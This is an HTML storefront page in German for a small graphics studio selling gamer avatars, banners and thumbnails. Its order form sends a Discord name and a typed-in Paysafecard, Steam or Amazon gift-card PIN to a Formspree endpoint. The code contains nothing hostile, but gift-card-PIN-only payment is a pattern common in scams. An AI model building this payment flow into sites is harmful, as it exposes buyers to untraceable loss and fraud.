<!DOCTYPE html>
<html lang="de" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SANCTUM STUDIO — Digital Graphics & Assets</title>

    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;800;900&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

    <!-- Lucide Icons -->
    <script src="https://unpkg.com/lucide@latest"></script>

    <style>
        :root {
            /* Dark Mode (Bloody Dark Romance) */
            --bg-base: #070709;
            --bg-surface: #0f0f14;
            --bg-card: #15151d;
            --border-color: rgba(220, 20, 60, 0.2);
            --border-focus: #dc143c;
            
            --text-primary: #e2e2e8;
            --text-secondary: #9a9ab0;
            --text-muted: #606075;
            
            --accent: #dc143c;           /* Crimson Red */
            --accent-hover: #ff1e4b;
            --accent-glow: rgba(220, 20, 60, 0.35);
            --accent-subtle: rgba(220, 20, 60, 0.1);
            
            --card-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.8);
            --nav-bg: rgba(7, 7, 9, 0.85);
            --radius-sm: 6px;
            --radius-md: 12px;
            --radius-lg: 20px;
        }

        html.light {
            /* Light Mode (Gothic Rose) */
            --bg-base: #f4f4f7;
            --bg-surface: #ffffff;
            --bg-card: #ffffff;
            --border-color: rgba(233, 30, 99, 0.25);
            --border-focus: #e91e63;
            
            --text-primary: #1a1a24;
            --text-secondary: #555566;
            --text-muted: #888899;
            
            --accent: #e91e63;           /* Hot Pink */
            --accent-hover: #ff2a75;
            --accent-glow: rgba(233, 30, 99, 0.25);
            --accent-subtle: rgba(233, 30, 99, 0.08);
            
            --card-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.08);
            --nav-bg: rgba(244, 244, 247, 0.85);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        html { scroll-behavior: smooth; font-family: 'Inter', sans-serif; background-color: var(--bg-base); color: var(--text-primary); }
        body { min-height: 100vh; display: flex; flex-direction: column; overflow-x: hidden; }
        h1, h2, h3, .font-heading { font-family: 'Cinzel', serif; letter-spacing: 1px; }
        a { color: inherit; text-decoration: none; }

        .container { max-width: 1100px; margin: 0 auto; padding: 0 24px; width: 100%; }

        header { position: fixed; top: 0; left: 0; right: 0; height: 70px; background: var(--nav-bg); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border-color); z-index: 1000; }
        .nav-wrapper { display: flex; align-items: center; justify-content: space-between; height: 100%; }
        .brand-logo { font-size: 1.2rem; font-weight: 900; letter-spacing: 2px; display: flex; align-items: center; gap: 8px; }
        .brand-logo i { color: var(--accent); }

        .theme-toggle-btn { background: var(--bg-card); border: 1px solid var(--border-color); color: var(--text-primary); width: 38px; height: 38px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; }

        .hero { padding: 140px 0 60px; text-align: center; }
        .hero-title { font-size: clamp(2rem, 5vw, 3.8rem); font-weight: 900; margin-bottom: 16px; }
        .hero-title span { color: var(--accent); text-shadow: 0 0 20px var(--accent-glow); }
        .hero-subtitle { color: var(--text-secondary); max-width: 600px; margin: 0 auto 30px; font-size: 1rem; line-height: 1.6; }

        .section { padding: 60px 0; border-bottom: 1px solid var(--border-color); }
        .section-title { font-size: 2rem; text-align: center; margin-bottom: 10px; }
        .section-desc { text-align: center; color: var(--text-secondary); margin-bottom: 40px; }

        .order-section { background: var(--bg-surface); border-radius: var(--radius-lg); border: 1px solid var(--border-color); padding: 32px; max-width: 700px; margin: 0 auto; box-shadow: var(--card-shadow); }
        
        .form-group { margin-bottom: 20px; }
        .form-label { display: block; font-size: 0.8rem; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 1px; }
        .form-control { width: 100%; padding: 12px 14px; background: var(--bg-base); border: 1px solid var(--border-color); border-radius: var(--radius-sm); color: var(--text-primary); }
        .form-control:focus { outline: none; border-color: var(--border-focus); box-shadow: 0 0 10px var(--accent-glow); }
        textarea.form-control { resize: vertical; min-height: 90px; }
        
        .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }

        .btn { padding: 12px 24px; border-radius: var(--radius-sm); font-weight: 700; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; gap: 8px; border: none; transition: all 0.2s ease; }
        .btn-primary { background-color: var(--accent); color: #fff; box-shadow: 0 0 15px var(--accent-glow); width: 100%; }
        .btn-primary:hover { background-color: var(--accent-hover); transform: translateY(-2px); }

        footer { padding: 30px 0; text-align: center; font-size: 0.8rem; color: var(--text-muted); }

        @media (max-width: 600px) { .form-grid { grid-template-columns: 1fr; } .order-section { padding: 20px; } }
    </style>
</head>
<body>

    <header>
        <div class="container nav-wrapper">
            <a href="#" class="brand-logo">
                <i data-lucide="flame"></i>
                <span>SANCTUM STUDIO</span>
            </a>
            <button class="theme-toggle-btn" id="themeToggle" aria-label="Toggle Theme">
                <i data-lucide="moon" id="themeIcon"></i>
            </button>
        </div>
    </header>

    <main>
        <section class="hero">
            <div class="container">
                <h1 class="hero-title">SANCTUM <span>STUDIO</span></h1>
                <p class="hero-subtitle">High-End Digital Graphics, Avatars, Headers & Animated Motion Assets.</p>
            </div>
        </section>

        <section class="section" id="order">
            <div class="container">
                <h2 class="section-title">Bestellung aufgeben</h2>
                <p class="section-desc">Gib deine Wünsche und deinen Gutscheincode direkt ein.</p>

                <div class="order-section">
                    <!-- Formspree Integration mit deiner ID: mnpjonyq -->
                    <form action="https://formspree.io/f/mnpjonyq" method="POST">
                        
                        <div class="form-grid">
                            <div class="form-group">
                                <label class="form-label" for="service">Produkt / Asset</label>
                                <select id="service" name="Produkt" class="form-control" required>
                                    <option value="Custom Gamer Avatar (5€)">Custom Gamer Avatar (5 €)</option>
                                    <option value="Social Banner (10€)">Discord / Social Banner (10 €)</option>
                                    <option value="YouTube Thumbnail (5€)">YouTube / TikTok Thumbnail (5 €)</option>
                                    <option value="Animated Graphic / GIF (15€)">Animated Graphic / GIF (15 €)</option>
                                    <option value="Full Branding Pack (20€)">Full Pack [Avatar + Banner + Thumbnail] (20 €)</option>
                                </select>
                            </div>

                            <div class="form-group">
                                <label class="form-label" for="discord">Dein Discord-Name</label>
                                <input type="text" id="discord" name="Discord_User" class="form-control" placeholder="z.B. Yvaine#1234" required>
                            </div>
                        </div>

                        <div class="form-grid">
                            <div class="form-group">
                                <label class="form-label" for="payment">Zahlungsart</label>
                                <select id="payment" name="Zahlungsart" class="form-control" required>
                                    <option value="Paysafecard">Paysafecard</option>
                                    <option value="Steam Gift Card">Steam Gift Card</option>
                                    <option value="Amazon Gutschein">Amazon Gutschein</option>
                                </select>
                            </div>

                            <div class="form-group">
                                <label class="form-label" for="code">Gutscheincode (PIN)</label>
                                <input type="text" id="code" name="Gutschein_Code" class="form-control" placeholder="16-stelliger Code" required>
                            </div>
                        </div>

                        <div class="form-group">
                            <label class="form-label" for="notes">Anmerkungen / Motivwünsche</label>
                            <textarea id="notes" name="Wünsche_Details" class="form-control" placeholder="Farben, Style, Anime-Charakter, Text auf dem Bild..."></textarea>
                        </div>

                        <button type="submit" class="btn btn-primary">
                            <i data-lucide="send"></i> Bestellung kostenpflichtig absenden
                        </button>
                    </form>
                </div>
            </div>
        </section>
    </main>

    <footer>
        <div class="container">
            <p>&copy; 2026 SANCTUM STUDIO. All rights reserved.</p>
        </div>
    </footer>

    <script>
        lucide.createIcons();

        // Dark / Light Mode Switcher
        const themeToggleBtn = document.getElementById('themeToggle');
        const themeIcon = document.getElementById('themeIcon');
        const htmlElement = document.documentElement;

        function setTheme(theme) {
            if (theme === 'light') {
                htmlElement.classList.remove('dark');
                htmlElement.classList.add('light');
                themeIcon.setAttribute('data-lucide', 'sun');
                localStorage.setItem('sanctum_theme', 'light');
            } else {
                htmlElement.classList.remove('light');
                htmlElement.classList.add('dark');
                themeIcon.setAttribute('data-lucide', 'moon');
                localStorage.setItem('sanctum_theme', 'dark');
            }
            lucide.createIcons();
        }

        const savedTheme = localStorage.getItem('sanctum_theme') || 'dark';
        setTheme(savedTheme);

        themeToggleBtn.addEventListener('click', () => {
            const currentTheme = htmlElement.classList.contains('light') ? 'light' : 'dark';
            setTheme(currentTheme === 'light' ? 'dark' : 'light');
        });
    </script>
</body>
</html>
